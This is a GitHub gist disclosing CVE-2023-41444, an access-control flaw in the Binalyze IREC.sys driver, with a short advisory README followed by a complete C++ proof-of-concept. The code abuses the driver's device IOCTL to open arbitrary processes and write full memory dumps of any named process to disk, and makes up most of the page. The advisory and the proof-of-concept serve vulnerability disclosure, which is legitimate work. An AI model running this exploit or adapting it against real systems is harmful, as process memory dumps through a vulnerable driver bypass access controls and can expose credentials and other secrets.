
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@dru1d-foofus](https://avatars.githubusercontent.com/u/4245930?s=64&v=4)](/dru1d-foofus)

# [dru1d-foofus](/dru1d-foofus)/**[README.md](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0)**

Last active
May 21, 2024 23:56

Show Gist options

* [Download ZIP](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/archive/73893ee51180dc152ac71bc2d187114728cdf90e.zip)

* [Star
  (9)
  9](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0)You must be signed in to star a gist
* [Fork
  (6)
  6](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0.js&quot;&gt;&lt;/script&gt;
* Save dru1d-foofus/1af21179f253879f101c3a8d4f718bf0 to your computer and use it in GitHub Desktop.

[Code](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0)
[Revisions
3](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/revisions)
[Stars
9](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/stargazers)
[Forks
6](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0.js&quot;&gt;&lt;/script&gt;

Save dru1d-foofus/1af21179f253879f101c3a8d4f718bf0 to your computer and use it in GitHub Desktop.

[Download ZIP](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/archive/73893ee51180dc152ac71bc2d187114728cdf90e.zip)

CVE-2023-41444 - IREC.sys Vulnerability

 [Raw](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/raw/73893ee51180dc152ac71bc2d187114728cdf90e/README.md)

[**README.md**](#file-readme-md)

# CVE-2023-41444 - Binalyze IREC.sys Vulnerable Driver

## Credits

Mike Alfaro (@\_mmpte\_software) and Tyler Booth (@tyler\_dru1d)

## Description

An issue in Binalyze IREC.sys v.3.11.0 and before allows a local attacker to execute arbitrary code and escalate privileges due to an improper DACL being applied to the device the driver creates.

## Vulnerability Type

Incorrect Acess Control

## Affected Products

IREC.sys < Version 3.11.0

## References

* <https://blog.dru1d.ninja/windows-driver-exploit-development-irec-sys-a5eb45093945>
* <https://github.com/magicsword-io/LOLDrivers/blob/main/yaml/d74fdf19-b4b0-4ec2-9c29-4213b064138b.yml>

 [Raw](/dru1d-foofus/1af21179f253879f101c3a8d4f718bf0/raw/73893ee51180dc152ac71bc2d187114728cdf90e/Source.cpp)

[**Source.cpp**](#file-source-cpp)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | #include <windows.h> |
| --- | --- |
|  | #include <iostream> |
|  | #include <dbghelp.h> |
|  | #include <TlHelp32.h> |
|  |  |
|  |  |
|  | #define IOCTL\_BASE 0x80012008 |
|  | constexpr DWORD IREC\_IOCTL(DWORD x) { return IOCTL\_BASE + x; } |
|  | #define IOTCL\_IREC\_OPEN\_PROCESS IREC\_IOCTL( 0x20 ) |
|  | static const char\* DeviceName = R"(\\.\IREC)"; |
|  |  |
|  | typedef struct \_IREC\_OPEN\_PROCESS { |
|  | DWORD pid; |
|  | } IREC\_OPEN\_PROCESS, \* PIREC\_OPEN\_PROCESS; |
|  |  |
|  |  |
|  | DWORD GetProcessIdByName(const std::wstring & processName) { |
|  | HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS\_SNAPPROCESS, 0); |
|  | PROCESSENTRY32 pEntry; |
|  | pEntry.dwSize = sizeof(pEntry); |
|  |  |
|  | BOOL hRes = Process32First(hSnapShot, &pEntry); |
|  | while (hRes) { |
|  | if (wcscmp(pEntry.szExeFile, processName.c\_str()) == 0) { |
|  | CloseHandle(hSnapShot); |
|  | return pEntry.th32ProcessID; |
|  | } |
|  | hRes = Process32Next(hSnapShot, &pEntry); |
|  | } |
|  |  |
|  | CloseHandle(hSnapShot); |
|  | return 0; // If process is not found return 0 |
|  | } |
|  |  |
|  | std::wstring StringToWString(const std::string & s) { |
|  | int len; |
|  | int slength = (int)s.length() + 1; |
|  | len = MultiByteToWideChar(CP\_ACP, 0, s.c\_str(), slength, 0, 0); |
|  | wchar\_t\* buf = new wchar\_t[len]; |
|  | MultiByteToWideChar(CP\_ACP, 0, s.c\_str(), slength, buf, len); |
|  | std::wstring r(buf); |
|  | delete[] buf; |
|  | return r; |
|  | } |
|  |  |
|  | constexpr DWORD cexpr\_lstrlenW(const wchar\_t str[]) { |
|  | DWORD i = 0; |
|  | while (str[i++]) {} |
|  | return i; |
|  | } |
|  |  |
|  | void DumpProcess(const std::string & processName, const std::string & dumpFilePath) { |
|  |  |
|  | std::wstring wideProcessName = StringToWString(processName); |
|  |  |
|  | HANDLE hDevice = INVALID\_HANDLE\_VALUE; |
|  | BOOL bResult = FALSE; |
|  | BOOL bDumpResult = FALSE; |
|  | HANDLE hProcess = NULL; |
|  | DWORD dwBytesReturned; |
|  |  |
|  | DWORD processId = GetProcessIdByName(wideProcessName); // Replace with actual function to get PID from process name |
|  |  |
|  | hDevice = CreateFileA(DeviceName, GENERIC\_READ | GENERIC\_WRITE, FILE\_SHARE\_READ | FILE\_SHARE\_WRITE, NULL, OPEN\_EXISTING, FILE\_ATTRIBUTE\_NORMAL, NULL); |
|  |  |
|  | if (hDevice == NULL) { |
|  | printf("Failed to open device.\n"); |
|  | return; |
|  | } |
|  |  |
|  | IREC\_OPEN\_PROCESS openProcess; |
|  | openProcess.pid = processId; |
|  |  |
|  | bResult = DeviceIoControl(hDevice, IOTCL\_IREC\_OPEN\_PROCESS, &openProcess, sizeof(DWORD), &openProcess, sizeof(HANDLE), &dwBytesReturned, NULL); |
|  |  |
|  | if (!bResult) { |
|  | printf("DeviceIoControl failed with error: %d\n", GetLastError()); |
|  | return; |
|  | } |
|  |  |
|  | hProcess = (HANDLE)openProcess.pid; |
|  |  |
|  | processId = GetProcessId(hProcess); |
|  | if (processId == 0) { |
|  | printf("Failed to get process ID. Error: %lu\n", GetLastError()); |
|  | return; |
|  | } |
|  |  |
|  | printf("[\*] %s Process ID: %lu\n", processName.c\_str(), processId); |
|  |  |
|  | if (!hProcess || hProcess == INVALID\_HANDLE\_VALUE) { |
|  | printf("Invalid process handle: %p\n", hProcess); |
|  | return; |
|  | } |
|  |  |
|  | HANDLE hFile = CreateFileA(dumpFilePath.c\_str(), GENERIC\_WRITE, FILE\_SHARE\_WRITE, NULL, CREATE\_ALWAYS, FILE\_ATTRIBUTE\_NORMAL, NULL); |
|  |  |
|  | if (hFile == INVALID\_HANDLE\_VALUE) { |
|  | DWORD dwError = GetLastError(); |
|  | printf("CreateFileA failed with error: %lu\n", dwError); |
|  | return; |
|  | } |
|  |  |
|  | bDumpResult = MiniDumpWriteDump(hProcess, 0, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL); |
|  | if (!bDumpResult) { |
|  | DWORD dwError = GetLastError(); |
|  | printf("Dump failed with error: %lu\n" + dwError); |
|  | } |
|  | else { |
|  | printf("[\*] Dump succeeded.\n"); |
|  | } |
|  | CloseHandle(hProcess); |
|  | CloseHandle(hFile); |
|  | } |
|  |  |
|  | void ShowHelp() { |
|  | printf("Usage: program [command] [arguments]\n"); |
|  | printf("Here are the available commands:\n"); |
|  |  |
|  | printf("\tdump <process name> <file path>: Dump a process memory into a file.\n"); |
|  | printf("\t\tExample: IREC-PoC.exe dump process.exe C:\\temp\\dumpfile.dmp\n"); |
|  |  |
|  | printf("If no command is provided, the help menu will be displayed.\n"); |
|  | } |
|  |  |
|  | int main(int argc, char\* argv[]) { |
|  | if (argc < 2) { |
|  | ShowHelp(); |
|  | return -1; |
|  | } |
|  |  |
|  | std::string command = argv[1]; |
|  |  |
|  | if (command == "dump") { |
|  | if (argc < 4) { |
|  | printf("Please provide a process name and a dump file path with the dump command.\n"); |
|  | return -1; |
|  | } |
|  | std::string processName = argv[2]; |
|  | std::string dumpFilePath = argv[3]; |
|  | DumpProcess(processName, dumpFilePath); |
|  | } |
|  | else { |
|  | ShowHelp(); |
|  | return -1; |
|  | } |
|  |  |
|  | return 0; |
|  | } |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fdru1d-foofus%2F1af21179f253879f101c3a8d4f718bf0)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

